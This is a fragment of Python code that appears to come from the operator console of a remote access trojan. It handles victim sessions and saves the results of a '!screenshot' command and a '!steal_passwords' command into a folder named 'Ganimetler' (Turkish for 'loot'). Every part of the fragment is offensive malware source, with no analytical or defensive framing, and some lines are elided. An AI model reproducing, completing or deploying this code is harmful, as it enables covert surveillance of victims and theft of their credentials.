        ...
        try:
            ...
            if cmd == "!screenshot":
                try:
                    ...
                    img_path = os.path.join("Ganimetler", f"screenshot_{sid}.png")
                    with open(img_path, "wb") as f:
                        f.write(img_data)
                    print(f"{C.GREEN}[+] Screenshot saved to {img_path}{C.RESET}")
                except:
                    print(f"{C.WHITE}{resp}{C.RESET}")
            elif cmd == "!steal_passwords":
                try:
                    out_path = os.path.join("Ganimetler", f"passwords_{sid}.txt")
                    with open(out_path, "w", encoding="utf-8") as f:
                        f.write(resp)
                    print(f"{C.GREEN}[+] Passwords saved to {out_path}{C.RESET}")
                except:
                    print(f"{C.WHITE}{resp}{C.RESET}")
            else:
                print(f"{C.WHITE}{resp}{C.RESET}")
